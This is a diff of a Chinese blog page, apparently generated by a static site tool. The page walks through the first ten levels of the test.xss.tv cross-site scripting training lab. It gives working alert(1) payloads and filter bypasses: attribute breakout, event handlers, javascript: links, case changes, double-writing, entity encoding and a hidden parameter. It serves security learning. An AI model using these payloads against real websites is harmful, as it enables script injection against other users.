@@ -511,7 +511,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="42">
-<input type="hidden" id="yelog_site_word_count" value="93.1k">
+<input type="hidden" id="yelog_site_word_count" value="92k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -876,18 +876,18 @@
         </a>
         
         <a  class="全部文章 CTF刷题 Crypto "
-           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
-           data-tag="Crypto"
-           data-author="" >
-            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
-            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
-        </a>
-        
-        <a  class="全部文章 CTF刷题 Crypto "
            href="/2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"
            data-tag="Crypto"
            data-author="" >
             <span class="post-title" title="实验吧--密码学">实验吧--密码学</span>
+            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
+        </a>
+        
+        <a  class="全部文章 CTF刷题 Crypto "
+           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
+           data-tag="Crypto"
+           data-author="" >
+            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
             <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
         </a>
         
@@ -1123,13 +1123,15 @@
 好，说完这些就开始我们的闯关之路吧！
 
 <p><strong>Level 1</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166921488_201104351_H800.png" alt="在这里插入图片描述"><br>第一题很简单，没有任何过滤，直接构造命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.xss.tv&#x2F;level1.php?name&#x3D; &lt;script&gt; alert(1) &lt;&#x2F;script&gt;test</span><br></pre></td></tr></table></figure>
+<pre><code>http://test.xss.tv/level1.php?name= &lt;script&gt; alert(1) &lt;/script&gt;test</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712167668567_201104351_H800.png" alt="在这里插入图片描述"><br>该注入产生的原因是由于程序员没有过滤或用引号包裹参数，所输入代码被直接执行，导致形成XSS漏洞。</p>
 <p><strong>level 2</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169005068_201104351_H800.png" alt="在这里插入图片描述"><br>右键查看源码，发现<br><code>&lt;input name=keyword  value=&quot;test&quot;&gt;</code><br>即需要构造闭合代码命令：<br><code>http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;test</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712165357112_201104351_H800.png" alt="在这里插入图片描述"><br>带有<code>&lt;input&gt;</code>标签的GET型XSS需要闭合参数才能进行注入。普通的GET型可直接被解析。</p>
 <p><strong>Level 3</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712163314958_201104351_H800.png" alt="在这里插入图片描述"><br>先查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;input name=keyword  value=&#39;&#39;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;</code></pre>
 <p>这里接着使用上一关方法注入，但要注意的是表单提交并没有<code>name=writing</code>的 因此需要把<code>wrting</code>改成<code>keyword</code><br>构造命令：<br><code>http://test.xss.tv/level3.php? keyword=&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;wait</code><br>然而并没有成功，产查看源码发现尖括号被解析了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&#39;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;wait&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;input name=keyword  value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;wait&#39;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;</code></pre>
 <p>因此这里我们采用 <code>onclick</code>触发事件 <code>onclick</code> 事件直接包含在&lt;&gt;内，可直接被执行。观察源代码为单引号，把value给闭合掉。<br>构造命令：</p>
 <pre><code>http://test.xss.tv/level3.php? keyword=&#39;onclick=&#39;javascript:alert(1)&#39;</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712168127283_201104351_H800.png" alt="在这里插入图片描述"><br> 🆗注入成功，ps：onclick触发事件需要<strong>点击一下输入框才</strong>能被触发</p>
@@ -1141,20 +1143,21 @@
 <p><strong>Level 5</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162806799_201104351_H800.png" alt="在这里插入图片描述"><br>同样的套路把上面的两种方法都试试，没有成功。查看源码：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712163674423_201104351_H1920.png" alt="在这里插入图片描述"><br>发现这里对<code>on</code> 进行了过滤，变成了<code>o_n</code>,于是我们采用链接的形式进行注入<br>构造语句：</p>
 <pre><code>http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162806799_201104351_H800.png" alt="在这里插入图片描述"><br>点一下那个链接就行了，好的，下一关(●’◡’●)<br><strong>Level  6</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161445354_201104351_H800.png" alt="在这里插入图片描述"><br>这里我么们直接使用上题的注入方式，然后发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot; &quot;&gt;&lt;a hr_ef&#x3D;&quot;javascript:alert(1)&quot;&gt;&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot; &quot;o_nclick&#x3D;&#39;javascript:alert(1)&#39; &quot;&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot; &quot;&lt;scr_ipt&gt; alert(1)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code>&lt;input name=keyword  value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;
+&lt;input name=keyword  value=&quot; &quot;o_nclick=&#39;javascript:alert(1)&#39; &quot;&gt;
+&lt;input name=keyword  value=&quot; &quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;&gt;</code></pre>
 <p>发现这里的<strong>href    script    onclick</strong>  都被过滤了   可以尝试下大小写绕过 。<br>构造命令如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.xss.tv&#x2F;level6.php?keyword&#x3D;&quot;ONclick&#x3D;&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>http://test.xss.tv/level6.php?keyword=&quot;ONclick=&quot;javascript:alert(1)&quot;</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161445354_201104351_H800.png" alt="在这里插入图片描述"><br>好了，next</p>
 <p><strong>Level 7</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712164270644_201104351_H800.png" alt="在这里插入图片描述"><br>同样的用上面三种方法进行注入，发现这题对 <strong>on  href   script</strong>     进行了完全屏蔽，但是魔高一尺，道高一丈（￣︶￣）↗　有人想出了双写绕过法。哈哈哈<br>构造命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.xss.tv&#x2F;level7.php?keyword&#x3D;&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;&#x2F;sscriptcript&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>http://test.xss.tv/level7.php?keyword=&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161937933_201104351_H800.png" alt="在这里插入图片描述"><br>好的，下一关ヾ(≧▽≦*)o</p>
 <p><strong>Level 8</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162629065_201104351_H800.png" alt="在这里插入图片描述"><br>这题接着尝试用上述方法试试，发现这题过滤了<code>&quot;  &lt;  &gt; </code>，emm… 有点恶心，查看源码发现<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043825794517_201104351_H800.png" alt="在这里插入图片描述"><br>这里有个友情链接，可以发现，这里相当于一个<code>&lt;a&gt;</code>标签注入，那么我们直接输入<code>javascript:alert(1)</code>试试  ；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043824725694_201104351_H800.png" alt="在这里插入图片描述"><br>可以看到这里script被转义，试试大写绕过，不行；这里介绍一种新的注入方法：<strong>HTML字符转换绕过</strong>→ <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">地址</a> 网上一搜一大堆，将<code>script</code>转换为16进制，10进制也行（还可以使用url编码等其他网页语言）<br><strong>ps:这里要在输入框内输入。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>
+<pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166957247_201104351_H800.png" alt="在这里插入图片描述"><br>好的，下关。<br><strong>Level 9</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169921097_201104351_H800.png" alt="在这里插入图片描述"><br>直接输入上题代码；发现不行，查看源码<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169700182_201104351_H800.png" alt="在这里插入图片描述"><br>emmm没啥头绪，查看别人的blog知道这需要加<code>http://</code><br>构造命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) &#x2F;&#x2F; http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<pre><code> java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) // http://</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166388421_201104351_H800.png" alt="在这里插入图片描述"><br>ok 下关👇<br><strong>Level 10</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712167469473_201104351_H800.png" alt="在这里插入图片描述"><br>尝试了几种方法之后发现 这题很绝，没有输出点<br>查看源码：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043824725694_201104351_H800.png" alt="在这里插入图片描述"><br> 在查看大佬的blog后知道了方法，首先构造代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link&#x3D;&quot; text&quot; &amp;t_history&#x3D;&quot;text&quot;&amp;t_sort&#x3D;&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>&amp;t_link=&quot; text&quot; &amp;t_history=&quot;text&quot;&amp;t_sort=&quot;text&quot;</code></pre>
 <p>测试哪个可以注入<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166526974_201104351_H1920.png" alt="在这里插入图片描述"><br>这里<code>t_sort</code> 就是注入点，构造命令(ps:代码中有隐藏的参数设置,把hidden改为text)</p>
 <pre><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code></pre>
 <p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712165116927_201104351_H800.png" alt="在这里插入图片描述"><br>好啦，下面几关需要抓包，暂时还不会，加上近期有点忙，以后有时间补上（￣︶￣）↗　。</p>
